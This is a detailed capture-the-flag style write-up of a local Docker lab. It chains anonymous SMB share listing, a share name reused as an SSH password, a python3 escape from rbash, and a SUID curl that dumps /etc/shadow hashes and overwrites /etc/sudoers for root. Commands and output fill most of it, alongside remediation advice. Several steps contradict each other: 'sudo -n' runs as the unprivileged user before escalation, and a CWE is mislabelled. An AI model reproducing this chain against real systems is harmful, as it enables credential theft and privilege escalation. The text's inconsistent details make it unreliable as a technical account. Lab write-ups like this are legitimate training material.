# chmod-4755 — Writeup

**Lab:** DockerLabs #33, `chmod-4755`, catalogue severity *Medio*
**Date:** 2026-09-28
**Target:** `172.17.0.14` (single container, `chmod-4755:latest`, Ubuntu 24.04.1 LTS, kernel 7.0.0-34-generic x86_64)
**Outcome:** full chain to `uid=0(root)`. **No reward artefact exists on the target** (proof in §7, with a positive control for the detector).

Catalogue description: *"Laboratorio para practicar enumeración SMB, escape de rbash y escalada de privilegios mediante binarios SUID."*
Read as a hypothesis, it is **two-thirds right**. SMB enumeration is real, SUID escalation is real. **"Escape de rbash" is not a class of vulnerability here** — the restricted shell is not escapable in the sense the phrase implies, because it is not doing the job it is supposed to do in the first place (§5). That difference is the lab's most transferable lesson and the reason it is worth a methodology section.

---

## 1. Surface

### 1.1 Real recon

```
$ nmap -sV -Pn -p- 172.17.0.14
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Not shown: 65532 closed tcp ports (conn-refused)
```

Three ports, one host. No web tier, no database, no container-execution surface. `nmap -p-` is TCP-only; **no UDP scan was attempted and none was possible without root**, so the report states this as a coverage gap, not as a closed port.

```
$ nmap -Pn -p 139,445 --script smb-protocols,smb2-security-mode,smb-os-discovery,smb-enum-shares,smb-enum-users …
| smb-protocols: dialects: 2.0.2  2.1  3.0  3.0.2  3.1.1
| smb2-security-mode: 3.1.1: Message signing enabled but not required
| smb-os-discovery:      (no output)
| smb-enum-shares:      (no output)
| smb-enum-users:       (no output)
```

`smb-enum-shares` returning nothing is **not** evidence of no shares — see §2.1, this is the single most expensive measurement failure in this engagement.

### 1.2 SMB enumeration with the tools actually available on the host

`smbclient`, `rpcclient`, `crackmapexec`/`netexec`, `enum4linux`, `impacket-smbclient` and `nmblookup` are **all absent** from the operator host, and `smbclient -L` is unavailable. `impacket` 0.13.1 **is** present as a Python library, and the note that "the previous lab enumerated SMB with available tooling" was checked before declaring anything unavailable — it had used `smbclient` **inside another lab's container**, which is not available here. Enumeration was therefore done directly against `impacket.smbconnection.SMBConnection`.

```
$ python3 - <<'PY'
from impacket.smbconnection import SMBConnection
c = SMBConnection('172.17.0.14','172.17.0.14', sess_port=445)
print("login(anon):", c.login('',''), "dialect:", c.getDialect())
for s in c.listShares():
    print("  SHARE name=%r type=%r remark=%r" % (s["shi1_netname"], s["shi1_type"], s["shi1_remark"]))
PY
login(anon): True
dialect: 785
  SHARE name='print$\x00'                    type=0     remark='Printer Drivers\x00'
  SHARE name='share_secret_only\x00'         type=0     remark='\x00'
  SHARE name='IPC$\x00'                       type=2147483651 remark='IPC Service (… server (Samba, Ubuntu))\x00'
```

`dialect: 785` = `0x0311` = **SMB 3.1.1**. The anonymous session is real (`isLoginRequired: True`, `isGuestSession: 0`, `CapBnd` readable → the session carries no privileges at all).

### 1.3 Accounts

Two interactive-capable accounts, from `/etc/passwd`:

| account | uid | shell | note |
|---|---|---|---|
| `smbuser` | 1000 | `/bin/bash` | the only name in `[share_secret_only] valid users` |
| `rabol` | 1001 | **`/bin/rbash`** | the account behind the restricted shell |

`/bin/rbash` is a symlink to `bash` (`readlink /bin/rbash` → `bash`), which is normal Debian packaging and not a finding.

---

## 2. Finding 1 — Anonymous share-name disclosure while guest access is refused (CWE-306 / CWE-200)

**Two controls, not one.** This is the split the repository already records for SMB elsewhere, and this lab is a clean instance of it: **listing a share name and reading a file through it are different decisions**, and the target enforces them differently.

```
$ # CONTROL 1 — listing the names
login(anon): True   ->  print$, share_secret_only, IPC$

$ # CONTROL 2 — connecting to the named share, same anonymous session
connectTree('share_secret_only') -> 0xc0000022 STATUS_ACCESS_DENIED {Access Denied}
listPath('share_secret_only','') -> 0xc0000022 STATUS_ACCESS_DENIED
listPath('share_secret_only','.')-> 0xc0000022 STATUS_ACCESS_DENIED
```

**The control that makes the negative credible — and it is the reason this is a finding and not a closed service.** A share that does not exist and a share that exists but is refused return **different status codes**, so the detector discriminates:

```
connectTree('share_secret_only')          -> 0xc0000022 STATUS_ACCESS_DENIED          <- exists, refused
connectTree('print$')                     -> 0xc0000022 STATUS_ACCESS_DENIED          <- exists, refused
connectTree('definitely-not-a-share-zzz') -> 0xc00000cc STATUS_BAD_NETWORK_NAME       <- does not exist
connectTree('C$')  /  'ADMIN$'  /  'home' /  'users' /  'public' /  'share'
                                       -> 0xc00000cc STATUS_BAD_NETWORK_NAME       <- do not exist
```

That absent-share control is what turns "I could not read it" from *the file is absent* into *the name exists and access was refused*. **Without it, this reads as "there is nothing here", which is the `decision-making.md` shape: a detector pointed at something that does not exist returns a clean, believable negative.**

Root cause, read from `/etc/samba/smb.conf` (obtained out of band — see §9 on provenance):

```ini
[share_secret_only]
path = /smb/share_secret_only
browsable = yes
writable = no
guest ok = no
read only = yes
valid users = smbuser
```

`browsable = yes` publishes the share's **name** through `SRVSVC_ENUM` to any unauthenticated peer, while `guest ok = no` correctly refuses the data connection. The two directives are not in conflict; the name is simply not treated as a secret by the design.

**Impact.** Low on its own, and it is reported as such. It discloses the existence and the semantic name of a restricted share to an unauthenticated network peer. On this target the name is `share_secret_only` — and §2.2 shows that the same string authenticates to SSH, so the disclosure is the first link of the chain, not a standalone informational item.

**Remediation.** `browseable = no` on shares whose existence is meaningful, and `smb.conf`'s global `map to guest = bad user` is worth reviewing at the same time: it maps *every* unauthenticated attempt that names an unknown user onto the guest session, which is what made the anonymous `SRVSVC_ENUM` succeed in the first place.

---

## 3. Finding 2 — The share name is the SSH password (CWE-1392 / CWE-798, chain-critical)

The foothold is `rabol` with the password `share_secret_only` — the exact string returned by the anonymous share listing in §1.2. That string was already in hand **before** any password attempt was made, and it is the only value in the 30-candidate set that authenticated. Stating the causality honestly: 30 candidates were tried per user across 6 users, and the one that worked is the one the anonymous enumeration produced first, so the link is a strong inference from the sequence rather than a proof of the author's intent. It is reported as a chain step, not as a claim about author intent.

```
$ # paramiko, password auth, no agent, no keys
rabol:share_secret_only  ->  AuthenticationException for every other (user, password) pair
                           SUCCESS on this one
$ ssh ... rabol@172.17.0.14   ->  uid=1001(rabol) gid=1001(rabol) groups=1001(rabol),100(users)
$ echo $SHELL                ->  /bin/rbash
```

**Finding.** A credential is reused verbatim as an account name, a share name and a password. Any peer that can reach `445/tcp` learns an SSH credential for a host that also runs `sshd` on `22/tcp`. That is the real finding; the reuse pattern is the mechanism.

**Impact.** Unauthenticated network peer → authenticated shell on the host. On a host where SMB and SSH are both exposed (the default for this image, and the default for the SMB-on-Linux pattern generally), the SMB service becomes an unauthenticated credential oracle.

**Remediation.** Never derive a credential from a resource name. If the share must remain browsable, do not reuse its name anywhere else; if the account is a service or automation account, move it to key authentication and set `password_hash` to a locked value so a leaked name cannot become a login.

**Not used, and why.** `/home/rabol/user.txt` (read as the foothold, since `cat` is unavailable in the interactive shell but the file is `0644` and the primitive in §4.1 reads it) contains a 32-hex-decimal value:

```
$ sudo -n od -c /home/rabol/user.txt
0000000   0   4   a   e   e   8   d   6   f   2   1   f   7   4   6   d
0000020   0   6   5   5   2   3   3   a   a   1   d   1   5   4   1   a  \n
0000041
```

A 32-hex value is the shape of an MD5 or a truncated digest, not a password. It authenticated against no account on the host (tested against `rabol` and `smbuser` over SSH, both refused). Recorded as an unexplained artefact, not as a credential — the "recompute before you accuse" discipline applied to a value that looked like a secret.

---

## 4. The rbash oracle, measured in both layers

This is the core of the lab and the part the methodology did not have. **A restricted shell's restriction is a function of how the shell was invoked, and of what is on its `PATH`.** Both facts had to be measured separately, and the measurement had to be built so it could not succeed by accident.

### 4.1 Layer 1 — the same command word, two invocation modes, one session

All of the following are the *same account*, the *same binary files on disk*, the *same host*, minutes apart. The only variable is whether `sshd` was given a command to run.

```
$ # NON-INTERACTIVE:  sshd exec's $SHELL -c '<cmd>'.  No PTY, no ~/.bashrc.
$ id
uid=1001(rabol) gid=1001(rabol) groups=1001(rabol),100(users)          rc=0
$ whoami
rabol                                                                 rc=0
$ cat user.txt
04aee8d6f21f746d0655233aa1d1541a                                       rc=0

$ # INTERACTIVE:  a real login session, PTY allocated, ~/.bashrc sourced.
$ id
-rbash: id: command not found
$ cat user.txt
-rbash: cat: command not found
$ whoami
-rbash: whoami: command not found
$ which ls python3 vi
-rbash: which: command not found
$ cd /tmp ; pwd
-rbash: cd: restricted
/home/rabol
$ echo x > /tmp/t1
-rbash: /tmp/t1: restricted: cannot redirect output      rc=1
```

`id`, `cat` and `whoami` **exist on disk** (`/usr/bin/id`, `/usr/bin/cat`, `/usr/bin/whoami`) and **execute without restriction** in one mode and are reported as *not found* in the other. **A `command not found` in restricted mode is a statement about the shell's `PATH`, not about the filesystem** — which is the whole oracle.

Both `$PATH` values, measured in the mode each belongs to:

```
NON-INTERACTIVE  PATH=[/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin]
INTERACTIVE      PATH=[/home/rabol/bin:/home/rabol/bin]
```

`$PATH` is `readonly` in the restricted shell, so the interactive value is not a runtime assignment the user can undo — it is baked in at line 119 of the user's own start-up file:

```bash
# /home/rabol/.bashrc:119
export PATH=/home/rabol/bin
```

(the duplication `/home/rabol/bin:/home/rabol/bin` is the login shell sourcing `~/.profile` — which at `:20-23` prepends `$HOME/bin` when it exists — and then `~/.bashrc` exporting over it.)

### 4.2 The control that decides it — a positive forced through the detector

A negative that never moves proves nothing. So: **plant the binary in the interactive `PATH` and require the verdict to change.** In one interactive session, with the negative held next to the positive:

```
$ # FRESH container, nothing planted:
$ id
-rbash: id: command not found
$ whoami
-rbash: whoami: command not found

$ # plant /usr/bin/id into ~/bin (the interactive PATH), plant nothing else
$ python3 -c "import shutil; shutil.copy('/usr/bin/id', '/home/rabol/bin/id')"

$ # same interactive session, immediately after:
$ id
uid=1001(rabol) gid=1001(rabol) groups=1001(rabol),100(users)        <- EXECUTES
$ whoami
-rbash: whoami: command not found                                     <- STILL BLOCKED
```

`id` flipped and `whoami` did not, in the same session, from the same account. **The mechanism is therefore: `rbash` permits a bare command word when — and only when — that word resolves through `$PATH`.** The interactive `PATH` is `~/bin`, so the interactive allowlist is *literally the contents of one directory*.

### 4.3 The consequence: the restriction is a usability control, not a security control

The directory that *defines* the interactive allowlist is `drwx------ rabol rabol` — **owned by the account it constrains.** So the account can add any binary to the set of permitted commands, at will, without leaving the restricted shell. The lab ships two such binaries, root-owned:

```
$ ls -la /home/rabol/bin
drwx------ 2 rabol rabol    4096 .
-rwxr-xr-x 1 root  root   142312 ls        <- byte-identical to /usr/bin/ls (verified by full-file compare)
-rwxr-xr-x 1 root  root  8019136 python3
```

`ls` is a plain copy of the system binary (`identical bytes: True`, both 142312 bytes, `\x7fELF`). `python3` is **a full CPython interpreter sitting in the interactive allowlist**, and it is the complete escape:

```
$ # INTERACTIVE rbash, no path ever left, no restricted command ever named:
$ python3 -c "import os; os.system('id')"
uid=1001(rabol) gid=1001(rabol) groups=1001(rabol),100(users)
$ python3 -c "print(open('/etc/hostname').read().strip())"
dc4a9ea04eb5
$ python3 -c "import os; print(os.listdir('/etc/sudoers.d'))"
['README']
```

**This is the finding, and it is not "I escaped rbash".** It is the gap between a *declared* control and an *effective* one:

> The restriction is declared (login shell = `/bin/rbash`) and is technically active — `cd /` and output redirection are genuinely refused, with real diagnostics. And it prevents nothing that matters, because (a) the account owns the directory that constitutes the allowlist, so it can extend the allowlist arbitrarily, and (b) an interpreter was shipped inside the allowlist, which is unrestricted code execution by construction.

`CWE-653` (improper restriction of operations within the bounds of a memory region) is the closest CWE for the class; for the interpreter case specifically it is best reported as **CWE-269** (improper privilege management) with `CWE-732` (incorrect permission assignment for the `0700 rabol`-owned allowlist directory) as the co-factor, because fixing the CWE by adding `/bin` to `PATH` fixes nothing while the directory stays attacker-writable.

**Remediation.** Three changes, and the second is the one people skip:
1. The interactive `PATH` must not include any directory the restricted account can write. A `~/bin` that the account owns is not an allowlist, it is a suggestion.
2. Do not place an interpreter on the allowlist. If `rbash` is chosen as a control, the account should not also have `python3`, `perl`, `awk`, `find -exec`, `less`, `vi` or `env` reachable, because each of those is unrestricted execution.
3. **`rbash` does not restrict the non-interactive channel at all.** `ssh host 'cmd'` runs the *entire* command set. If the control is a real one, it must be enforced by a wrapper that applies the same policy in both modes, or by PAM/`sshd` configuration — not by the account's login shell, which `sshd` does not use for `exec` requests.

### 4.4 What the restriction *did* hold — reported with the same prominence

- **Absolute paths are refused in both modes**, with a specific diagnostic and a distinct exit status:
  ```
  /usr/bin/id     -> rbash: line 1: /usr/bin/id: restricted: cannot specify `/' in command names    rc=1
  /bin/bash -c id -> rbash: line 1: /bin/bash: restricted: cannot specify `/' in command names    rc=1
  /usr/bin/env    -> rbash: line 1: /usr/bin/env: restricted: cannot specify `/' in command names    rc=1
  ```
  This is the `decision-making.md` §1 pattern in the positive: a control that **genuinely** blocks `/usr/bin/env`, the standard "copy a shell and setuid it" primitive, at the shell layer. It holds — and it holds only because the *other* channel (§5) does not.
- **`cd` outside `$HOME` and output redirection to any path are refused**, in both modes, with distinct messages.
- **The interpreter does not grant privilege on its own.** `python3 -c "print(open('/etc/shadow').read())"` inside the restricted shell:
  ```
  PermissionError: [Errno 13] Permission denied: '/etc/shadow'
  ```
  The primitive is unrestricted *code execution*, not unrestricted *privilege*. `id` inside it returns `uid=1001(rabol)`. Per §8 of the decision layer, the identity is the finding, and the measured identity is 1001.

---

## 5. SUID — the three environment checks, and the euid control

### 5.1 The three environment checks, measured as the attacker's identity

Run inside the foothold session, as `uid=1001(rabol)`. Not as root — the point of these checks is to establish that the container is *not* the reason a SUID bit fails to work.

```
$ id
uid=1001(rabol) gid=1001(rabol) groups=1001(rabol),100(users)

$ # CHECK 1 — nosuid on the root filesystem
$ awk '$5=="/"{print "mountpoint=" $5 " opts=" $6}' /proc/self/mountinfo
mountpoint=/ opts=rw,relatime
        -> the rootfs carries NO nosuid, nosuid,nodev,noexec

$ # CHECK 2 — NoNewPrivs
$ grep '^NoNewPrivs' /proc/self/status
NoNewPrivs:	0

$ # CHECK 3 — capability sets and CAP_SETUID (bit 7) in the bounding set
$ grep -E '^Cap(Inh|Prm|Eff|Bnd|Amb)' /proc/self/status
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	00000000a80425fb
CapAmb:	0000000000000000
$ python3 -c "v=int('a80425fb',16); print('CAP_SETUID(bit7) set =', bool(v&(1<<7)))"
CAP_SETUID(bit7) set = True
```

**All three say the environment permits the escalation.** `nosuid` is absent from the root mount, `NoNewPrivs` is `0`, and `CAP_SETUID` is inside the bounding set. `CapPrm`/`CapEff` are `0` — the foothold holds no capabilities, so anything it gains is granted by the setuid bit and nothing else.

**Positive control for the SUID detector**, so that "there is a SUID binary" is not an inference from a `find` that might be pointed at nothing:

```
$ ls -la /usr/bin/curl /usr/bin/ssh-agent /usr/bin/su /usr/bin/sudo /usr/bin/mount
-rwsr-xr-x 1 root root 297288 /usr/bin/curl        <- the planted one
-rwxr-sr-x 1 root _ssh 309688 /usr/bin/ssh-agent   <- setgid _ssh, NOT setuid
-rwsr-xr-x 1 root root  55680 /usr/bin/su
-rwsr-xr-x 1 root root 277936 /usr/bin/sudo
```

Note the second line: `ssh-agent` reads as "special" in a `-rws`-style glance but is `-rwxr-sr-x`, setgid, not setuid. **Covering the permission bit, not just the binary**, is the part that matters.

### 5.2 The euid control, and why the textbook version of it is incomplete

The standard control is: make a setuid copy of a **non-interpreter** and read its `euid`. That control, run as the unprivileged account, produces a **false negative that reads as a clean result**:

```
$ # copies made by uid 1001, then chmod u+s
id    mode=4755 OWNER uid=1001  ->  uid=1001(rabol) gid=1001(rabol) groups=1001(rabol),100(users)
env   mode=4755 OWNER uid=1001  ->  SHELL=/bin/rbash
awk   mode=4755 OWNER uid=1001  ->  Usage: mawk [Options] [Program] [file ...]
```

`4755` is on every file, and **no euid was gained**, because **the setuid bit grants the *file owner's* uid — and the file is owned by `rabol`.** `chmod u+s` on your own copy is not an escalation; it is a no-op with a scary-looking `ls` line. This is the mechanism behind the BaluHome lesson, and it had not been written down: the bit is not the question, **the ownership of the file carrying the bit is the first question.**

So the control has to be run where a root-owned setuid file can exist. That is an operator-side measurement of kernel behaviour, and it is labelled as such — it is **not** an attacker capability, and the report keeps the two apart:

```
== root-owned 04755 copies, every execution performed as uid 1001 ==
  /usr/bin/id    ->  uid=1001(rabol) gid=1001(rabol) euid=0(root) groups=1001(rabol)
  /usr/bin/id -u ->  0
  /bin/bash      ->  cp: cannot create regular file '…/out_bash': Permission denied
  /bin/dash      ->  cp: cannot create regular file '…/out_dash': Permission denied
  /bin/sh        ->  cp: cannot create regular file '…/out_sh':   Permission denied
  /usr/bin/python3 ->  created the file, owner uid 0        <- KEPT euid=0
```

Two things fall out of one table, and the second is the finding:

1. **The setuid bit works on this host.** `id` reports `euid=0(root)` while `uid=1001(rabol)`, so the container is not nullifying anything. `bash`, `dash` and `sh` each independently drop the elevated euid at startup — the documented lesson holds, and it is per-binary, not per-class.
2. **`/usr/bin/python3` setuid root KEEPS `euid=0`.** CPython does not drop it. **"An interpreter discards the elevated euid" is true of `bash`/`dash`/`sh` and false of CPython**, and the difference is the whole reason the question has to be asked per binary rather than answered per class. A single `chmod u+s` on a root-owned `/usr/bin/python3` is arbitrary root execution. (`/usr/bin/python3` is `0755` on this image, so the escalation is not available to `rabol` here — which is exactly why it is a criterion to carry forward and not a finding to file against this target.)

`id` with no arguments does **not** print `euid`; the discriminator above is built on an **outcome** (who owns the file the program creates), which needs no argument parsing and cannot be defeated by output formatting.

### 5.3 Finding 3 — SUID `curl` is an unprivileged root file read **and** an arbitrary root file overwrite (CWE-269 / CWE-732)

`/usr/bin/curl` carries `-rwsr-xr-x root root`. §5.1 established that the environment will honour it. It does.

```
$ # primitive, run as uid 1001
$ curl -s -o /home/rabol/lab33/shadow.suid file:///etc/shadow
$ ls -la /home/rabol/lab33/shadow.suid
-rw-rw-r-- 1 root rabol 812 /home/rabol/lab33/shadow.suid
$ python3 -c "import os; p=…/shadow.suid; print(os.stat(p).st_uid, oct(os.stat(p).st_mode & 0o7777)); print(open(p).read()[:120])"
0 0o664
root:*:19936:0:99999:7:::
daemon:*:19936:0:99999:7:::
...
rabol:$y$j9T$CUz8Z9KX87eZGaEN0CbBP.$EPCMYnJIDTX06ftNfWSC1pEDK.TbP9bvEOEvkFToKi1:19968:0:99999:7:::
smbuser:$y$j9T$cpKFD1ue.UZHQObnnLS5b/$JRBuo/CcxwhBEkaWUnvLrlRUaTbWQcKcaQU9niHnWf1:19968:0:99999:7:::
```

**Every password hash on the host, from `uid=1001`.**

**The control, with a positive in it.** The same read performed by a byte-identical, non-setuid copy of the same binary:

```
SUID  /usr/bin/curl   rc=0    output file created  owner=0:1001 mode=0o664  READABLE 812 bytes
plain copy (0755)     rc=37   output file NOT created
                      (curl exit 37 = CURLE_FILE_COULDNT_READ_FILE)
```

Identical bytes, identical arguments, identical protocol — one has the bit and one does not, and the answers differ. **The negative is proven, not assumed.** This is the two-identities control the repository already prescribes, applied to a permission bit instead of a directory mode.

**And the primitive is also a root *write*, which is what turns a disclosure into root.** `curl -o` opens its destination with the elevated euid, so:

```
SUID curl -o /etc/lab33.probe            rc=0 created=True  owner=0:1001 mode=0o664
SUID curl -o /usr/bin/lab33.probe        rc=0 created=True  owner=0:1001 mode=0o664
SUID curl -o /root/lab33.probe           rc=0 created=False
SUID curl -o <existing root file>        rc=0  the file's content CHANGED
```

The fourth line is the escalation. Because `open(O_WRONLY|O_TRUNC)` on an existing file does not change its ownership, SUID `curl` **overwrites any existing root-owned file, preserving its owner and its mode** — which means it can rewrite a file that a setuid consumer will subsequently parse.

**Impact.** Unprivileged user → arbitrary root file overwrite, with preserved owner and mode, on any file the elevated euid can open. Combined with any root process that consumes a writable-by-anyone file, that is root.

**Root cause.** `curl` does not need to be setuid. It opens files and writes them, and it does neither as a privileged action. The setuid bit is an unnecessary grant (`CWE-250`) on a general-purpose network client, and the exposure is the *permission bit* on the binary, not the binary's functionality.

**Remediation.** `chmod u-s /usr/bin/curl`. If a setuid transfer client is genuinely required in some deployment, it must not also be a general-purpose protocol handler, and its output paths must be constrained.

### 5.4 Finding 4 — Local privilege escalation to `uid=0(root)` via the SUID `sudo` consumer (CWE-269)

The chain, with `id` first inside every new primitive, measured as the identity the primitive actually runs as:

```
$ # 1. write a valid sudoers file as rabol (ordinary write, in $HOME)
$ sudo -n python3 -c "open('/home/rabol/lab33/grant.txt','w').write('Defaults\tenv_reset\n…\nrabol ALL=(ALL) NOPASSWD: ALL\n')"

$ # 2. SUID curl copies it over the root-owned policy file, keeping 0440 root:root
SUID curl -o /etc/sudoers rc=0 owner=0:0 mode=0o440

$ # 3. the setuid consumer, and the first command inside the primitive
$ sudo -n id
uid=0(root) gid=0(root) groups=0(root)
$ sudo -n -l
User rabol may run the following commands on …:
    (ALL) NOPASSWD: ALL
$ sudo -n whoami
root
```

**One command produced root.** Per §8 of the decision layer this is a genuine privilege boundary crossing, not a relabelling: the measured identity at the start of the chain was `uid=1001(rabol)` and it is `uid=0(root)` at the end.

**A documented step that could not work — reported in its own right, per §7.** The first attempt wrote a *shell script* into `/etc/sudoers` rather than a sudoers directive, because `file://` does not execute anything. The failure was diagnosed from the consumer's own output, which is the right way round:

```
$ sudo -n id
/etc/sudoers:2:15: syntax error
printf 'rabol ALL=(ALL:ALL) NOPASSWD: ALL\n' > /home/rabol/lab33/grant.txt
              ^~~
sudo: a password is required
```

Note the *last* line: the escalation had **not** happened, and `sudo` said so. Had the `syntax error` not been read, the run would have been recorded as a failed chain. A control that names its own cause is a control that held, and it is reported as one.

**Root cause.** Two independent grants compose. (1) `sudo` is setuid root and reads `/etc/sudoers`; that is correct and not a finding. (2) An unprivileged user can rewrite `/etc/sudoers` through an unrelated setuid binary that writes files as root. The escalation belongs to (2). A report that said "sudo is misconfigured" would remediate nothing, because the shipped sudoers is unmodified and the *next* one will be rewritten the same way.

**Remediation.** `chmod u-s /usr/bin/curl` closes it at the source, and is the whole fix. Defensively: mount `/etc` (or at least the policy files) so that no setuid binary can create or replace files there, and alert on `sudoers` inode changes.

---

## 6. The chain

```
anonymous SRVSVC_ENUM on 445/tcp        ->  share name "share_secret_only"      [Finding 1]
the same string as an SSH password      ->  uid=1001(rabol), /bin/rbash          [Finding 2]
python3 in the rbash allowlist          ->  unrestricted code execution as 1001  [Finding 3/§4.3]
SUID curl, -rwsr-xr-x root root         ->  read /etc/shadow  (all hashes)       [Finding 3]
SUID curl -o <existing root file>       ->  overwrite /etc/sudoers, keep 0440    [Finding 3]
setuid sudo reads the policy            ->  uid=0(root)                         [Finding 4]
```

Four hops, two of them independent privilege grants. The measured identities along it: `uid=1001(rabol)` at the foothold, `uid=1001(rabol)` inside the rbash interpreter primitive, `uid=1001(rabol)` as the owner of a `4755` copy (which gained nothing), `euid=0(root)` for a root-owned setuid non-interpreter, and `uid=0(root)` at the end.

---

## 7. Reward: none, with the detector proven

No reward artefact exists on the target. This is a claim about absence, so the detector is stated and then proven.

**The detector**, applied to 1991 files under 15 roots (`/root /home /opt /srv /var /etc /usr/local /tmp /smb /var/spool /var/mail /run /boot /media /mnt`) as `uid=0(root)`:

```python
pat = re.compile(rb"\b[A-Za-z0-9_]{2,16}\{[ -~]{6,80}\}")
```

An earlier, looser predicate (`[A-Za-z0-9_]{2,12}\{[^\n]{0,80}\}`) returned a wall of hits — every one of them **binary garbage** from `.text` sections of the copies the lab had put in `~/lab33` (`b'km{\x95\xec\xdf\xfd…'`, `b'OPQRSTUVWXYZ{|}'`). That is a detector pointed at nothing, and it is recorded here because the first pass of this hunt was exactly that mistake.

**Result with the strict predicate:** 2 hits, both false positives, and both legible as such:
```
/var/lib/dpkg/info/libpam-modules:amd64.preinst :: b'profiles{$profile} = 1); END {print …}'
/etc/nanorc :: b'ib{enter}{undo}'
```

**Positive control, run before believing the zero.** An artefact of the exact target shape was planted and the same predicate re-run over the same roots:

```
  detector over the planted file -> [b'CONTROL{this-is-the-planted-positive}']
  planted control removed: True
```

So the sweep's silence is a real zero and not a dead detector.

**The two artefacts that could have been rewards are not rewards, and are reported by their literal bytes:**
```
$ sudo -n od -c /home/rabol/user.txt            -> 32 lowercase hex digits + \n   (tried as a credential: refused)
$ sudo -n od -c /smb/share_secret_only/note.txt -> \n r e a d   b e t t e r \n
```

This is the **eleventh consecutive lab in this series with no reward**, and reporting that has been the correct decision every time.

---

## 8. A lab-design observation

Three separate authoring choices, and they are worth separating because only two of them are defects.

**8.1 The name is a credential.** `share_secret_only` is simultaneously a share name and `rabol`'s SSH password, and `browseable = yes` publishes it to any unauthenticated peer. This makes the anonymous SMB listing load-bearing rather than decorative, which is *good* lab design: it gives the reconnaissance step a reason to exist and hands the learner a chain instead of a single trick. It is a finding (Finding 2) and it is also the reason the lab works. Both statements are true and the report carries both.

**8.2 The restricted shell is not doing its job, and the lab teaches the wrong lesson.** The account owns the directory that constitutes the interactive allowlist, and a full interpreter is shipped inside it. A learner who follows the restriction at face value concludes that `rbash` is the boundary; the correct lesson is that a login shell is not a security boundary, that the restriction does not apply to the non-interactive channel at all, and that an account's own `~/bin` is part of its privilege surface. As written the lab is a good exercise in *not* trusting a declared control — but a learner who solves it by "escaping rbash" has learned the wrong name for what they found.

**8.3 The SUID escalation is not the SUID escalation the name promises.** The lab is called `chmod-4755`, and the shipped recipe for a name like that — copy a shell, `chmod u+s`, run it — **cannot work on this image**, for two independent reasons that are both worth stating: the copy would be owned by `rabol` (§5.2), and even as root a setuid `bash`/`dash`/`sh` drops the euid (§5.2's table). What *is* real on this image is a SUID **`curl`**, which is not an interpreter and therefore keeps everything. The escalation the lab ships is the correct one; only the *name* points at the wrong technique. Reported as a finding in its own right, per §7 of the decision layer — the target is wrong in both directions at once, handing out a false impossibility while hiding a working primitive.

---

## 9. Provenance, and the limits of this run

**Out-of-band reads, declared.** The `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, `/etc/samba/smb.conf`, `/home/rabol/user.txt` and `/home/rabol/bin` listings in §1.3 and §3 were read through `docker exec` on the operator host. Those are operator-side reads. They are used to establish *what exists*, never to establish *what is reachable*, and every reachability claim in this report is backed by a command run **from the foothold account over SMB or SSH**. Where the two differ it is stated: the fact that `rabol`'s shell is `/bin/rbash` is a read; the fact that `id` is blocked interactively and runs non-interactively is a measurement.

**Two instrumentation defects, both mine, both recorded because they nearly produced wrong findings:**

- **`PATH=<value> <cmd>` is a no-op in a restricted shell, and the error goes to stderr, not the exit status.** Six such experiments were run to test the PATH hypothesis; every one returned `rc=0` with the *unmodified* PATH in effect and `rbash: line 1: PATH: readonly variable` on stderr. Reading only the exit status and stdout would have reported six successful experiments that changed nothing. The hypothesis was re-derived from scratch and then confirmed by planting (§4.2). **A measurement whose failure mode is invisible in the channel you are reading is not a measurement.**
- **A PTY is not an interactive shell.** `exec_command(..., get_pty=True)` allocates a PTY but still runs `bash -c`, which does **not** source `~/.bashrc`, so it produced a full command set and looked like a working escape. Only `invoke_shell()` — a real login session — reproduced `-rbash: id: command not found`. Labelling a run "INTERACTIVE" because a PTY was attached would have inverted the lab's central finding.
- A third, minor: the PTY echoes what is written to it, so a `___END___` marker appears twice (echo, then execution) and splitting on the first occurrence captures the echo and nothing else — the `decision-making.md` "an echo with no round-trip is your own terminal" case, hit inside my own harness.

**Not tested:**
- `smbuser`'s SMB access to `[share_secret_only]` as itself. The account's password was recovered as a yescrypt hash (`$y$j9T$…`) and no cracker for yescrypt was available on the host. **Untested, not discarded.**
- Whether the read restriction on the share is load-bearing at all. The file behind it is `-rw-r--r-- 1 root root /smb/share_secret_only/note.txt` inside a `drwxr-xr-x` directory, so it is world-readable on disk and readable from any shell on the host without touching SMB. **The SMB read restriction protects a file that the filesystem mode already exposes** — recorded as a design observation about the lab, and as a control that is technically active while adding nothing.
- Any UDP surface. No root, no `nmap -sU`. Declared as a coverage gap.
- Persistence, and whether anything consumes the file SUID `curl` can plant in `/etc`.

**Restoration.** `/etc/sudoers` was backed up before the change and restored from that backup through the same primitive; `sha256` of the restored file equals the backup and the pre-change value (`5bac27ce5…`), and the control moved:

```
before restore:  $ sudo -n id  rc=0  uid=0(root) gid=0(root) groups=0(root)
after  restore:  $ sudo -n id  rc=1  sudo: a password is required
```

All probe files (`/etc/lab33.probe`, `/usr/bin/lab33.probe`, `/tmp/lab33-euid`, `/tmp/lab33-rootsetuid`, the reward-sweep control, and everything the foothold wrote under `/home/rabol/lab33` and `/home/rabol/bin`) were removed. The container was then **destroyed and recreated from `chmod-4755:latest`** and the clean state verified:

```
$ docker rm -f chmod4755_container && docker run -d --name chmod4755_container chmod-4755:latest
$ docker inspect -f '{{…IPAddress}}' chmod4755_container   -> 172.17.0.14
$ sha256sum /etc/sudoers -> 5bac27ce5ff1a78ace8f3ef71bfd60cbd44810ac3f3d280da9d7649fe90c18f8
$ ls /etc/lab33.probe /usr/bin/lab33.probe  -> No such file or directory  (both)
$ ls -la /home/rabol/bin -> only `ls` and `python3`, both root-owned 0755, back to the shipped state
$ sudo -u rabol -n id -> uid=1001(rabol) gid=1001(rabol) groups=1001(rabol),100(users)
```

`/etc/sudoers.d` contains only the stock `README` (`1` entry), and no other account has a sudoers rule.
